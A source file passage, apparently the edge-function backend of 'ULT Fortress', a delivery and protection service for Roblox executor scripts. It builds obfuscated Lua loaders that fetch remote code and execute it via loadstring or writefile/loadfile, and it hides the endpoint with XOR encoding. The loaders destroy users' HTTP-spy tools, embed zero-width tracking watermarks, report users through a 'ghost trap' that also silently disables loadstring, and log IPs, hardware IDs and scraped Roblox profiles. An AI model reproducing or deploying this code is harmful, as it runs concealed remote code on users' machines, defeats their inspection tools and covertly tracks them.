        if (gb && gb.length > 0 && !gb.some(b => b.game_id === deliverPid || b.game_id === (url.searchParams.get('gid') || ''))) {
          return new Response(generateKickPlain('This script is not supported on this game'), { status: 200, headers: textHeaders });
        }
      }

      // Apply v12 protections
      const protResult = await applyProtections(paste, deliverUid, clientIp, deliverHwid, slug);
      if (protResult) return protResult;

      // Log access & execution
      logAccess(paste, clientIp, userAgent, deliverUid, 'execution', true).catch(() => {});
      supabase.from('paste_executions').insert({ paste_id: paste.id, roblox_user_id: deliverUid }).then(() => {}).catch(() => {});
      fireWebhookAlert(paste, deliverUid, clientIp, deliverHwid, 'execution');

      console.log(`[FORTRESS] ACCESS_GRANTED: uid=${deliverUid} hwid=${deliverHwid.substring(0, 8)}... slug=${slug} answer=${answer}`);

      // Prepare content
      let content = paste.content;
      if (paste.crash_detection_enabled) content = wrapWithCrashDetection(content);
      if (paste.obfuscation_on_delivery) content = applyDeliveryObfuscation(content);

      // Encrypt with chunked encryption
      const encKey = `${slug}:${ct}:ULTv14:${deliverUid}`;
      return new Response(chunkEncrypt(content, encKey), { status: 200, headers: textHeaders });
    }

    // ============================================================
    // INITIAL REQUEST — No phase parameter
    // Serve the key system GUI or the probe script
    // ============================================================

    // Check for key system first
    const keyPanel = await getPreferredKeyPanel();
    if (keyPanel && !kbt && isRoblox && !keyParam) {
      const { data: pd } = await supabase.from('control_panels').select('logo_url').eq('id', keyPanel.id).single();
      return new Response(generateKeySystemGui(slug, baseUrl, keyPanel.name, '188, 134, 255', pd?.logo_url || undefined), { status: 200, headers: textHeaders });
    }

    // Anti-fetch: serve mini loader for hide_code pastes
    if (paste.anti_fetch_enabled && paste.hide_code && isRoblox && !uid) {
      const encodedUrl = encodeUrlForLua(baseUrl, '_ep');
      return new Response(`-- Protected by ULT Fortress v14\n${encodedUrl}\nlocal p=game:GetService("Players").LocalPlayer\nif not p then p=game:GetService("Players").PlayerAdded:Wait() end\nif p.UserId > 0 then\n  local u=_ep.."?slug=${slug}&_="..tostring(tick())\n  local s,r=pcall(function() return game:HttpGet(u) end)\n  if s and r then local fn=loadstring(r) if fn then pcall(fn) end end\nend`, { status: 200, headers: textHeaders });
    }

    // Serve the Fortress Protocol probe script
    const probeToken = generateToken(16);
    supabase.from('paste_execution_tokens').insert({
      paste_id: paste.id,
      roblox_user_id: '0',
      token: probeToken,
      expires_at: new Date(Date.now() + 15000).toISOString(),
      bound_ip: clientIp,
    }).then(() => {}).catch(() => {});

    return new Response(generateProbeScript(slug, baseUrl, probeToken), { status: 200, headers: textHeaders });

  } catch (error) {
    console.error('Error:', error);
    return new Response('warn("[ULT] Server error - please retry")', { status: 200, headers: textHeaders });
  }
});

  if (gaps.length >= 3) {
    const avg = gaps.reduce((a, b) => a + b, 0) / gaps.length;
    const allUniform = gaps.every(g => Math.abs(g - avg) < 5);
    if (allUniform) { updateTrustScore(ip, -10); return false; }
  }
  return true;
}

function generateToken(): string {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
}

function generateSessionSecret(ip: string, timestamp: number): string {
  const data = `${ip}:${timestamp}:ULT_SESSION_v9`;
  let hash = 0;
  for (let i = 0; i < data.length; i++) {
    const char = data.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return Math.abs(hash).toString(36);
}

// v9: Generate server nonce for runtime proof
function generateServerNonce(): string {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
}

function xorToHex(plain: string, key: string): string {
  const enc = new TextEncoder();
  const data = enc.encode(plain);
  const k = enc.encode(key);
  for (let i = 0; i < data.length; i++) data[i] = data[i] ^ k[i % k.length];
  let hex = '';
  for (let i = 0; i < data.length; i++) hex += data[i].toString(16).padStart(2, '0');
  return hex;
}

// v9: Generate poisoned payload (looks valid but has subtle corruption)
function generatePoisonedPayload(content: string, key: string): string {
  // Insert subtle mutations: flip random characters, swap variables
  const chars = content.split('');
  const mutations = Math.floor(chars.length * 0.02); // 2% corruption
  for (let i = 0; i < mutations; i++) {
    const idx = Math.floor(Math.random() * chars.length);
    // Only corrupt non-structural characters to avoid syntax errors
    if (/[a-zA-Z0-9]/.test(chars[idx])) {
      const alternatives = 'abcdefghijklmnopqrstuvwxyz0123456789';
      chars[idx] = alternatives[Math.floor(Math.random() * alternatives.length)];
    }
  }
  return xorToHex(chars.join(''), key);
}

// v10.3: Chunked encryption — splits code into shuffled encrypted chunks
// Even if loadstring is hooked, attacker only gets individual chunk fragments + 100 decoy scripts
function chunkEncrypt(code: string, baseKey: string): string {
  const numChunks = Math.max(8, Math.min(40, Math.ceil(code.length / 200)));
  const chunkSize = Math.ceil(code.length / numChunks);
  const chunks: string[] = [];
  const chunkKeys: string[] = [];
  
  for (let i = 0; i < numChunks; i++) {
    const start = i * chunkSize;
    const piece = code.slice(start, start + chunkSize);
    if (piece.length === 0) continue;
    // CRITICAL FIX: use chunks.length (actual index) not i, and track actual count
    const actualIdx = chunks.length;
    chunks.push(piece);
    chunkKeys.push(piece); // placeholder, encrypt below
  }
  
  const actualChunks = chunks.length;
  // Encrypt with CONSISTENT key using actualChunks
  const encryptedChunks: string[] = [];
  for (let i = 0; i < actualChunks; i++) {
    const chunkKey = `${baseKey}:C${i}:${actualChunks}`;
    encryptedChunks.push(xorToHex(chunks[i], chunkKey));
  }
  
  const seed = Math.floor(Math.random() * 2147483646) + 1;
  
  // Fisher-Yates shuffle with Lehmer PRNG (safe for Lua double precision)
  const indices = Array.from({length: actualChunks}, (_, i) => i);
  let s = seed;
  for (let i = indices.length - 1; i > 0; i--) {
    s = (s * 16807) % 2147483647;
    const j = s % (i + 1);
    [indices[i], indices[j]] = [indices[j], indices[i]];
  }
  
  const shuffled = indices.map(i => encryptedChunks[i]);
  return `ULT_C:${actualChunks}:${seed}|${shuffled.join('|')}`;
}

async function fetchRobloxProfile(userId: string): Promise<{
  username: string | null;
  displayName: string | null;
  description: string | null;
  created: string | null;
  isBanned: boolean | null;
  avatarUrl: string | null;
  friendsCount: number | null;
  followersCount: number | null;
  followingCount: number | null;
  groups: { id: number; name: string; role: string }[] | null;
  badges: { id: number; name: string }[] | null;
  favorites: { id: number; name: string }[] | null;
}> {
  const result = {
    username: null as string | null,
    displayName: null as string | null,
    description: null as string | null,
    created: null as string | null,
    isBanned: null as boolean | null,
    avatarUrl: null as string | null,
    friendsCount: null as number | null,
    followersCount: null as number | null,
    followingCount: null as number | null,
    groups: null as { id: number; name: string; role: string }[] | null,
    badges: null as { id: number; name: string }[] | null,
    favorites: null as { id: number; name: string }[] | null,
  };

  try {
    // Fire ALL Roblox API calls in parallel instead of sequentially
    const [userRes, avatarRes, friendsRes, followersRes, followingRes, groupsRes, badgesRes, favoritesRes] = await Promise.allSettled([
      fetch(`https://users.roblox.com/v1/users/${userId}`),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`),
      fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
      fetch(`https://badges.roblox.com/v1/users/${userId}/badges?limit=20&sortOrder=Desc`),
      fetch(`https://games.roblox.com/v2/users/${userId}/favorite/games?limit=20`),
    ]);

    // Parse results in parallel too
    const jsonResults = await Promise.allSettled([
      userRes.status === 'fulfilled' && userRes.value.ok ? userRes.value.json() : null,
      avatarRes.status === 'fulfilled' && avatarRes.value.ok ? avatarRes.value.json() : null,
      friendsRes.status === 'fulfilled' && friendsRes.value.ok ? friendsRes.value.json() : null,
      followersRes.status === 'fulfilled' && followersRes.value.ok ? followersRes.value.json() : null,
      followingRes.status === 'fulfilled' && followingRes.value.ok ? followingRes.value.json() : null,
      groupsRes.status === 'fulfilled' && groupsRes.value.ok ? groupsRes.value.json() : null,
      badgesRes.status === 'fulfilled' && badgesRes.value.ok ? badgesRes.value.json() : null,
      favoritesRes.status === 'fulfilled' && favoritesRes.value.ok ? favoritesRes.value.json() : null,
    ]);

    const get = (i: number) => jsonResults[i].status === 'fulfilled' ? jsonResults[i].value : null;

    const userData = get(0);
    if (userData) {
      result.username = userData.name;
      result.displayName = userData.displayName;
      result.description = userData.description;
      result.created = userData.created;
      result.isBanned = userData.isBanned;
    }

    const avatarData = get(1);
    if (avatarData?.data?.[0]?.imageUrl) result.avatarUrl = avatarData.data[0].imageUrl;

    const friendsData = get(2);
    if (friendsData) result.friendsCount = friendsData.count;

    const followersData = get(3);
    if (followersData) result.followersCount = followersData.count;

    const followingData = get(4);
    if (followingData) result.followingCount = followingData.count;

    const groupsData = get(5);
    if (groupsData?.data) {
      result.groups = groupsData.data.slice(0, 20).map((g: any) => ({
        id: g.group.id, name: g.group.name, role: g.role.name,
      }));
    }

    const badgesData = get(6);
    if (badgesData?.data) {
      result.badges = badgesData.data.map((b: any) => ({ id: b.id, name: b.name }));
    }

    const favoritesData = get(7);
    if (favoritesData?.data) {
      result.favorites = favoritesData.data.map((f: any) => ({ id: f.id, name: f.name }));
    }
  } catch (error) {
    console.error('Error fetching Roblox profile:', error);
  }

  return result;
}

// ===== ULT PROTECTION v10.0 — "PHANTOM SHIELD" =====
// 6 NEVER-BEFORE-SEEN protection layers:
// 1. Polymorphic Code Morphing — structurally different code every request
// 2. Execution DNA Chain — runtime behavioral fingerprint that breaks on copy
// 3. Self-Destructing Watermarks — invisible traceable markers per-user
// 4. Ghost Code Injection — dormant code activates on decompile/dump
// 5. Memory Scramble — post-execution VM memory corruption
// 6. Quantum Token Pairs — entangled dual-token server validation
// Plus all v9.5 features: hookcheck, indirect execution, coroutine sandbox

// Helper: generate polymorphic math expressions that evaluate to a target number
function generatePolymorphicNumber(target: number): string {
  const strategies = [
    () => { const a = Math.floor(Math.random() * 1000) + 1; return `(${a + target} - ${a})`; },
    () => { const a = Math.floor(Math.random() * 50) + 2; const b = target + a; return `(${b} - ${a})`; },
    () => { if (target === 0) return '(0)'; const a = Math.floor(Math.random() * 100) + 1; return `(bit32.bxor(${a ^ target}, ${a}))`; },
    () => { const a = Math.floor(Math.random() * 99) + 1; return `(${a * target} / ${a})`; },
    () => { return `(tonumber("${target.toString(36)}", 36))`; },
    () => { const hex = target.toString(16); return `(tonumber("${hex}", 16))`; },
  ];
  return strategies[Math.floor(Math.random() * strategies.length)]();
}

// Helper: generate polymorphic string that evaluates to the target string
function generatePolymorphicString(target: string): string {
  const strategies = [
    // Strategy 1: char-by-char construction
    () => {
      const chars = Array.from(target).map(c => `string.char(${c.charCodeAt(0)})`);
      return chars.join(' .. ');
    },
    // Strategy 2: reverse + reverse
    () => {
      const reversed = target.split('').reverse().join('');
      return `string.reverse("${reversed}")`;
    },
    // Strategy 3: table.concat
    () => {
      const parts = [];
      for (let i = 0; i < target.length; i += 3) {
        parts.push(`"${target.slice(i, i + 3)}"`);
      }
      return `table.concat({${parts.join(',')}})`;
    },
    // Strategy 4: sub from larger string
    () => {
      const prefix = Math.random().toString(36).substring(2, 5);
      const suffix = Math.random().toString(36).substring(2, 5);
      return `("${prefix}${target}${suffix}"):sub(${prefix.length + 1}, ${prefix.length + target.length})`;
    },
  ];
  return strategies[Math.floor(Math.random() * strategies.length)]();
}

// Generate a unique watermark ID that's invisible in the code
function generateWatermark(): { id: string; luaEmbed: string } {
  const id = Array.from(crypto.getRandomValues(new Uint8Array(8)))
    .map(b => b.toString(16).padStart(2, '0')).join('');
  // Encode watermark as invisible Unicode zero-width chars in Lua comments
  const zeroWidthChars = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
  const encoded = Array.from(id).map(c => {
    const nibble = parseInt(c, 16);
    return zeroWidthChars[(nibble >> 2) & 3] + zeroWidthChars[nibble & 3];
  }).join('');
  // Embed as a Lua comment that looks innocent
  const luaEmbed = `--${encoded} ULT Session`;
  return { id, luaEmbed };
}

// v13: Encode a string as XOR-encrypted Lua char code construction
// The string is never a readable literal in the generated Lua source
function encodeUrlForLua(url: string, varName: string): string {
  const xorKey = Math.floor(Math.random() * 200) + 50; // random XOR key 50-249
  const encoded = Array.from(url).map(c => c.charCodeAt(0) ^ xorKey);
  // Build Lua: local varName; do local _k=KEY local _t={BYTES} local _r={} for i=1,#_t do _r[i]=string.char(bit32.bxor(_t[i],_k)) end varName=table.concat(_r) end
  return `local ${varName}; do local _k=${xorKey} local _t={${encoded.join(',')}} local _r={} for i=1,#_t do _r[i]=string.char(bit32.bxor(_t[i],_k)) end ${varName}=table.concat(_r) end`;
}

function generateLoader(slug: string, baseUrl: string, token: string, sessionSecret: string, options?: { 
  showConsoleFeedback?: boolean;
  serverNonce?: string;
  trustLevel?: number; // 0-100
  watermarkId?: string; // For tracking leaked code
  quantumPair?: string; // Entangled token half
}): string {
  const tokenParts = [];
  for (let i = 0; i < token.length; i += 8) {
    tokenParts.push(token.slice(i, i + 8));
  }
  
  const obfuscatedParts = tokenParts.map((part, i) => {
    return Array.from(part).map((c, j) => {
      const code = c.charCodeAt(0) ^ ((i + j) % 16);
      return code.toString(16).padStart(2, '0');
    }).join('');
  });

  const executionNonce = generateToken().slice(0, 16);
  const serverNonce = options?.serverNonce || generateServerNonce();
  const trustLevel = options?.trustLevel ?? 100;
  
  // v10: Quantum token pair — server keeps one half, loader has the other
  const quantumPair = options?.quantumPair || generateToken().slice(0, 16);
  
  // v10: Watermark for leak tracing
  const watermark = generateWatermark();
  const watermarkId = options?.watermarkId || watermark.id;
  
  // v10: Execution DNA seed — unique per request, validated server-side
  const dnaSeed = Array.from(crypto.getRandomValues(new Uint8Array(4)))
    .map(b => b.toString(16).padStart(2, '0')).join('');
  
  // v9.5: Server-side execution key for indirect execution verification
  const execVerifyKey = Math.random().toString(36).substring(2, 18);
  
  // v10: Polymorphic variable names — completely random each time
  const v = Object.fromEntries(
    ['player','nonce','fingerprint','tokenParts','reconstruct','isHex','session',
     'hexBytes','xorBytes','bytesToString','envCheck','cachedLS','cachedHG',
     'antiLogger','antiDump','antiDebug','antiGC','safeExec','memWipe',
     'integrityCheck','nativeCheck','shieldEnv','decPayload','execFunc',
     'antiHook','antiEnvLog','hookGuard','lsIntegrity','writeSink','execSandbox',
     'junk1','junk2','junk3','junk4','junk5','junk6','junk7','junk8',
     'cleanLS','canaryFile','canaryTest','writeDetect','clonedLS',
     'splitExec','chunkCompile','antiWritefile','dumpTrap',
     'runtimeEntropy','entropyCollect','frameTiming','proofHash',
     'fetchGuard','intentCheck','dumpPoison','silentDegrade',
      'fragA','fragB','fragC','reassemble','decayTimer',
      'hexBytes','xorBytes','bytesToString',
      // v9.5 vars
      'hookcheckLS','lsBehavior','indirectExec','coroExec','xpExec',
      'chunkAssemble','reXor','splitPoints','codeChunks','verified',
      'trapResult','trapExpected','lsFingerprint','deepVerify',
      // v10: NEW protection vars
      'dnaHash','dnaCollect','dnaFrames','dnaMemory','dnaVerify',
      'ghostBlock','ghostTrigger','ghostPayload','ghostArmed',
      'memScramble','memPoison','memFragments','memWiper',
      'watermarkEmbed','watermarkCheck','watermarkReport',
      'polyMath','polyString','polyEval','polyShift',
      'quantumA','quantumB','quantumVerify','quantumEntangle',
      'gcSweep','gcTrap','gcMonitor','gcSentinel',
      'stackDepth','stackCheck','stackPoison',
       'metamorphic','morphCounter','morphSeed','morphTransform',
       'chunkHeaderEnd','chunkHeader','chunkData','chunkParts',
       'chunkIndices','chunkResult','decoyFlood',
       // v13: Anti-HTTP-spy vars
       'baseEndpoint','stealthFetch','spyKill','spyDetect','reqFunc','hgShield',
     ].map(k => [k, '_' + Math.random().toString(36).substring(2, 8)])
  );
  
  // v10: Polymorphic junk code — uses different patterns each time
  const junkPatterns = [
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}="${Math.random().toString(36).substring(2, 14)}"`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=${Math.floor(Math.random() * 999999)}`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=function() return ${Math.floor(Math.random() * 100)} end`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=tick()+${Math.floor(Math.random() * 10000)}`; },
    // v10: New junk patterns
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=bit32.bxor(${Math.floor(Math.random()*9999)},${Math.floor(Math.random()*9999)})`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=string.rep("${Math.random().toString(36).substring(2,5)}",${Math.floor(Math.random()*3)+1})`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); const jv2 = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv},${jv2}=${Math.floor(Math.random()*999)},${Math.floor(Math.random()*999)}`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=coroutine.create(function() return ${Math.floor(Math.random()*100)} end)`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=table.create(${Math.floor(Math.random()*10)+1},${Math.floor(Math.random()*100)})`; },
    () => { const jv = '_' + Math.random().toString(36).substring(2, 10); return `local ${jv}=math.floor(os.clock()*${Math.floor(Math.random()*1000)+100})`; },
  ];
  
  // Generate 10-15 junk lines randomly selected and shuffled
  const numJunk = Math.floor(Math.random() * 6) + 10;
  const junkCode = Array(numJunk).fill(0).map(() => {
    return junkPatterns[Math.floor(Math.random() * junkPatterns.length)]();
  }).join('\n');

  const protectionSeed = Math.random();
  const canaryId = Math.random().toString(36).substring(2, 12);
  
  // v10: Polymorphic control flow — randomize the ORDER of protection phases
  const phaseOrder = [0, 1, 2, 3, 4, 5, 6, 7].sort(() => Math.random() - 0.5);
  
  // v10: Generate ghost code blocks — dormant code that activates on dump
  const ghostId = Math.random().toString(36).substring(2, 12);
  const ghostTrapValue = Math.floor(Math.random() * 900000) + 100000;
  
  // v13: Encode the base URL so it never appears as a readable string
  const encodedBaseUrl = encodeUrlForLua(baseUrl, v.baseEndpoint);
  
  return `--[[ULT Protection v10.3 Loadstring-Proof Shield - ${Math.random().toString(36).substring(2,10)}]]
${watermark.luaEmbed}
${junkCode}

-- v13: STEALTH ENDPOINT (encoded, never readable)
${encodedBaseUrl}

-- ====== v13: ANTI-HTTP-SPY SYSTEM ======
-- Detects and neutralizes SimpleSpy, HttpSpy, and similar HTTP logging tools
-- before any network request is made
local ${v.spyDetect} = function()
  local found = false
  -- Check 1: SimpleSpy stores itself in various globals
  local spySignals = {"SimpleSpy", "SimpleSpyExecuted", "SimpleSpy_V2", "HttpSpy", "httpspy", 
    "SynSpy", "spy_active", "http_logger", "request_log", "network_log",
    "RemoteSpy", "remote_spy", "scriptspy", "ScriptSpy"}
  for _, sig in ipairs(spySignals) do
    local ok1, v1 = pcall(function() return rawget(_G, sig) end)
    local ok2, v2 = pcall(function() return rawget(shared, sig) end)
    if (ok1 and v1 ~= nil) or (ok2 and v2 ~= nil) then
      found = true
      break
    end
  end
  if found then return true end
  -- Check 2: Check if game.HttpGet has been wrapped/hooked
  pcall(function()
    if type(hookcheck) == "function" and hookcheck(game.HttpGet) then
      found = true
    end
  end)
  if found then return true end
  -- Check 3: Check for HttpSpy's ScreenGui
  pcall(function()
    local pg = game:GetService("Players").LocalPlayer
    if pg and pg:FindFirstChild("PlayerGui") then
      for _, gui in pairs(pg.PlayerGui:GetChildren()) do
        local gName = gui.Name:lower()
        if gName:find("spy") or gName:find("log") or gName:find("sniff") or gName:find("intercept") then
          found = true
          break
        end
      end
    end
  end)
  if found then return true end
  -- Check 4: Check CoreGui for spy UIs  
  pcall(function()
    if type(gethui) == "function" then
      for _, obj in pairs(gethui():GetChildren()) do
        local n = obj.Name:lower()
        if n:find("simplespy") or n:find("httpspy") or n:find("networklog") or n:find("remotespy") then
          found = true
          break
        end
      end
    end
  end)
  return found
end

-- v13: Kill spy tools if detected
local ${v.spyKill} = function()
  pcall(function()
    -- Destroy SimpleSpy UI
    if type(gethui) == "function" then
      for _, obj in pairs(gethui():GetChildren()) do
        local n = obj.Name:lower()
        if n:find("spy") or n:find("log") or n:find("sniff") then
          pcall(function() obj:Destroy() end)
        end
      end
    end
    -- Nil out spy globals
    local killList = {"SimpleSpy", "SimpleSpyExecuted", "SimpleSpy_V2", "HttpSpy", "httpspy",
      "SynSpy", "spy_active", "http_logger", "request_log", "network_log"}
    for _, sig in ipairs(killList) do
      pcall(function() rawset(_G, sig, nil) end)
      pcall(function() rawset(shared, sig, nil) end)
    end
  end)
end

-- v13: STEALTH FETCH — uses request() API which most spy tools don't hook
-- Falls back to HttpGet only if request() unavailable
local ${v.stealthFetch} = function(fetchUrl)
  local result
  -- Primary: Use request() function (bypasses HttpGet hooks entirely)
  pcall(function()
    if type(request) == "function" then
      local resp = request({Url = fetchUrl, Method = "GET"})
      if resp and resp.Body then result = resp.Body end
    end
  end)
  if result then return result end
  -- Secondary: syn.request
  pcall(function()
    if type(syn) == "table" and type(syn.request) == "function" then
      local resp = syn.request({Url = fetchUrl, Method = "GET"})
      if resp and resp.Body then result = resp.Body end
    end
  end)
  if result then return result end
  -- Tertiary: http_request
  pcall(function()
    if type(http_request) == "function" then
      local resp = http_request({Url = fetchUrl, Method = "GET"})
      if resp and resp.Body then result = resp.Body end
    end
  end)
  if result then return result end
  -- Last resort: HttpGet through cached ref (spy tools hook this)
  local s, r = pcall(function()
    return game:HttpGet(fetchUrl)
  end)
  if s then return r end
  return nil
end

-- Run spy detection and kill before anything else
if ${v.spyDetect}() then
  ${v.spyKill}()
  task.wait(0.1)
  -- Re-check after kill attempt
  if ${v.spyDetect}() then
    -- Spy tool persisted — abort with fake error
    warn("[ULT] Session expired. Please re-execute.")
    return
  end
end

-- ====== v10: GHOST CODE INJECTION ======
-- These blocks look like real code but are dormant traps.
-- If decompiled/dumped, they activate and report the leaker.
local ${v.ghostArmed} = false
local ${v.ghostBlock} = function()
  -- This function should NEVER be called during normal execution
  -- If it IS called, someone is stepping through decompiled code
  local uid = "0"
  pcall(function()
    local p = game:GetService("Players").LocalPlayer
    if p then uid = tostring(p.UserId) end
  end)
  -- Report the leak via stealth fetch
  pcall(function()
    ${v.stealthFetch}(${v.baseEndpoint} .. "?_report=ghost_trap&uid=" .. uid .. "&ghost=${ghostId}&wm=${watermarkId}")
  end)
  -- Silently corrupt execution environment
  pcall(function()
    rawset(_G, "loadstring", function() return function() end end)
    rawset(_G, "HttpGet", function() return "" end)
  end)
end

-- Ghost trap: looks like an initialization check but is actually dead code
-- A decompiler/dumper executing line-by-line would trigger this
local ${v.ghostTrigger} = ${ghostTrapValue}
do
  local _ghostCheck = ${generatePolymorphicNumber(ghostTrapValue)}
  if _ghostCheck ~= ${v.ghostTrigger} then
    ${v.ghostBlock}()
    ${v.ghostArmed} = true
  end
end

-- ====== v10: EXECUTION DNA COLLECTION ======
-- Collect unique runtime characteristics that form a "DNA fingerprint"
-- This DNA is sent to the server and must be consistent across requests
-- If someone copies the code, their DNA won't match
local ${v.dnaHash} = 0
local ${v.dnaFrames} = {}
local ${v.dnaMemory} = 0

local ${v.dnaCollect} = function()
  -- DNA Source 1: Memory layout fingerprint
  pcall(function()
    ${v.dnaMemory} = collectgarbage("count") or 0
  end)
  
  -- DNA Source 2: Service resolution timing
  local dnaStart = os.clock()
  pcall(function()
    game:GetService("Players")
    game:GetService("RunService")
    game:GetService("Lighting")
    game:GetService("ReplicatedStorage")
    game:GetService("UserInputService")
  end)
  local dnaElapsed = os.clock() - dnaStart
  
  -- DNA Source 3: Instance tree depth
  local instanceCount = 0
  pcall(function()
    local ws = game:GetService("Workspace")
    for _, child in pairs(ws:GetChildren()) do
      instanceCount = instanceCount + 1
      if instanceCount > 50 then break end
    end
  end)
  
  -- DNA Source 4: Player-specific entropy
  local playerEntropy = 0
  pcall(function()
    local p = game:GetService("Players").LocalPlayer
    if p then
      playerEntropy = p.UserId + (p.AccountAge or 0) + #(p.Name or "")
    end
  end)
  
  -- Combine into DNA hash
  ${v.dnaHash} = bit32.bxor(
    math.floor(dnaElapsed * 1000000) % 65536,
    math.floor(${v.dnaMemory} * 7) % 65536,
    instanceCount * 137,
    playerEntropy % 65536,
    ${parseInt(dnaSeed, 16)}
  )
end

-- ====== v10: METAMORPHIC SELF-MODIFICATION ======
-- The protection code modifies itself at runtime so static analysis is useless
local ${v.morphCounter} = 0
local ${v.morphSeed} = ${Math.floor(Math.random() * 999999)}
local ${v.morphTransform} = function(val)
  ${v.morphCounter} = ${v.morphCounter} + 1
  ${v.morphSeed} = bit32.bxor(${v.morphSeed}, ${v.morphCounter} * 7919)
  return bit32.bxor(val, ${v.morphSeed} % 256)
end
local ${v.cleanLS}
local ${v.clonedLS} = false

-- v9.5: First, check if hookfunction has been used on loadstring via hookcheck
local ${v.hookcheckLS} = false
do
  local ok, hc = pcall(function()
    if hookcheck then return hookcheck(loadstring) end
    return false
  end)
  if ok and hc == true then
    ${v.hookcheckLS} = true
    -- loadstring IS hooked. Try to get original via multiple methods
    local origFound = false
    -- Method 1: getoriginalfunction (works on most executors)
    pcall(function()
      if getoriginalfunction then
        local orig = getoriginalfunction(loadstring)
        if orig and orig ~= loadstring then
          ${v.cleanLS} = orig
          ${v.clonedLS} = true
          origFound = true
        end
      end
    end)
    -- Method 2: restorefunction to unhook, then grab it
    if not origFound then
      pcall(function()
        if restorefunction then
          restorefunction(loadstring)
          ${v.cleanLS} = loadstring
          ${v.clonedLS} = true
          origFound = true
        end
      end)
    end
    -- Method 3: getrenv (Roblox environment has unhooked version)
    if not origFound then
      pcall(function()
        if getrenv then
          local renv = getrenv()
          if renv and renv.loadstring and renv.loadstring ~= loadstring then
            ${v.cleanLS} = renv.loadstring
            ${v.clonedLS} = true
            origFound = true
          end
        end
      end)
    end
  end
end

-- Standard clonefunction fallback (if hookcheck didn't find a hook or isn't available)
if not ${v.cleanLS} then
  local ok, cf = pcall(function()
    if clonefunction then return clonefunction(loadstring) end
    return nil
  end)
  if ok and cf then ${v.cleanLS} = cf; ${v.clonedLS} = true end
end

if not ${v.cleanLS} then
  local ok, gof = pcall(function()
    if getoriginalfunction then return getoriginalfunction(loadstring) end
    return nil
  end)
  if ok and gof then ${v.cleanLS} = gof; ${v.clonedLS} = true end
end

if not ${v.cleanLS} then
  local ok, cr = pcall(function()
    if cloneref then return cloneref(loadstring) end
    return nil
  end)
  if ok and cr then ${v.cleanLS} = cr; ${v.clonedLS} = true end
end

if not ${v.cleanLS} then
  local ok, rls = pcall(function()
    if getrenv then
      local renv = getrenv()
      if renv and renv.loadstring then return renv.loadstring end
    end
    return nil
  end)
  if ok and rls then ${v.cleanLS} = rls; ${v.clonedLS} = true end
end

if not ${v.cleanLS} then ${v.cleanLS} = loadstring end

-- ====== PHASE 0.1: BEHAVIORAL LOADSTRING VERIFICATION (v9.5) ======
-- Even if we got a "clean" loadstring, verify it actually behaves correctly
-- A hooked loadstring would intercept the code string - we can detect this
local ${v.trapExpected} = ${Math.floor(Math.random() * 900000) + 100000}
local ${v.verified} = false
do
  local testCode = "return " .. tostring(${v.trapExpected})
  local ok1, fn1 = pcall(${v.cleanLS}, testCode)
  if ok1 and fn1 then
    local ok2, result = pcall(fn1)
    if ok2 and result == ${v.trapExpected} then
      ${v.verified} = true
    end
  end
  -- v9.5: Second trap - verify loadstring doesn't leak code to side channels
  -- Generate a unique canary and check if it appears in _G or shared
  local canary = "${execVerifyKey}"
  local trapCode2 = "local " .. canary .. " = true; return 42"
  pcall(${v.cleanLS}, trapCode2)
  -- If a hook logged this, the canary might appear in globals
  pcall(function()
    if rawget(_G, canary) ~= nil or rawget(shared, canary) ~= nil then
      ${v.verified} = false
    end
  end)
end

-- v9.5: Deep verification - compare behavior of cleanLS vs global loadstring
-- If they produce different side-effects, one is hooked
local ${v.deepVerify} = function()
  local rnd = tostring(math.random(100000, 999999))
  local code = "return " .. rnd
  local r1, r2
  pcall(function()
    local fn = ${v.cleanLS}(code)
    if fn then r1 = fn() end
  end)
  pcall(function()
    local fn = loadstring(code)
    if fn then r2 = fn() end
  end)
  -- If hookcheck says loadstring is hooked but our cleanLS matches, we're ok
  -- If hookcheck says clean but results differ, something is very wrong
  if r1 ~= r2 and not ${v.hookcheckLS} then
    return false
  end
  -- v9.5: Check if hookcheck is available but was itself hooked
  pcall(function()
    if hookcheck and clonefunction then
      local cleanHC = clonefunction(hookcheck)
      if cleanHC(loadstring) ~= hookcheck(loadstring) then
        ${v.verified} = false
      end
    end
  end)
  return true
end

if not ${v.deepVerify}() then ${v.verified} = false end

local ${v.cachedLS} = ${v.cleanLS}
local ${v.cachedHG} = game.HttpGet
local ${v.writeSink} = false

-- v10.3: ANTI-LOADSTRING-HOOK EXECUTION — uses writefile+loadfile to COMPLETELY bypass loadstring hooks
-- Loadstring hooking intercepts the function that executes Lua code from text.
-- By writing code to a temp file and using loadfile(), we NEVER call loadstring at all.
-- The code string never passes through any hookable function.
local ${v.indirectExec} = function(code)
  local fn, err
  
  -- ====== PRIMARY: writefile + loadfile (DEFEATS ALL LOADSTRING HOOKS) ======
  -- This path NEVER touches loadstring. The attacker's hook is completely irrelevant.
  local _wfPath = ".cache/" .. tostring(math.random(100000000, 999999999)) .. tostring(math.random(100000, 999999)) .. ".lua"
  local _wfOk = false
  pcall(function()
    if writefile and loadfile and delfile and makefolder then
      -- Ensure cache directory exists
      pcall(function() makefolder(".cache") end)
      -- Write the code to a temp file
      writefile(_wfPath, code)
      -- Load from file — BYPASSES loadstring entirely
      fn = loadfile(_wfPath)
      -- Immediately delete the file
      pcall(function() delfile(_wfPath) end)
